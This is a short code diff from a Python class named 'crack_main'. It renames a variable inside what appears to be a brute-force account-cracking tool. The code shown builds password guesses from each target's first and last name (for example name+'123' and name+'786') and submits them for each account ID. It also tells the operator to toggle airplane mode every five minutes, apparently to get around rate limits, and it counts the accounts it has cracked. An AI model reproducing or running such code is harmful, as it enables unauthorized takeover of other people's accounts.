@@ -435,16 +435,16 @@ class crack_main():
                         print(' After Every 5 Min Turn Airplane On/Off')
                         print(50*'=')
                         for user in zee:
-                                iid,name = user.split('|')
-                                first_name = name.rsplit(' ')[0]
+                                iid,names = user.split('|')
+                                first_name = names.rsplit(' ')[0]
                                 try:
-                                        last_name = name.rsplit(' ')[1]
+                                        last_name = names.rsplit(' ')[1]
                                 except IndexError:
                                         last_name = 'Khan'
                                 fs = first_name.lower()
                                 ls = last_name.lower()
                                 passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
-                                formSubmit.submit(self.m1,iid,name,passlist)
+                                formSubmit.submit(self.m1,iid,names,passlist)
                 print(50*'=')
                 print(' SucessFully Process Is Completed ')
                 print(' Total Ok Ids : '+str(len(ok)))
@@ -466,7 +466,7 @@ class crack_main():
                         naseeb = open('...txt','a').write(xdr)
                 self.id = open('...txt').read().splitlines()
                 self.pasw()
-        def m1(self,iid,name,passlist):
+        def m1(self,iid,names,passlist):
                 try:
                         global ok,loop,android_models
                         sys.stdout.write('\r[ZEE] %s / [OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
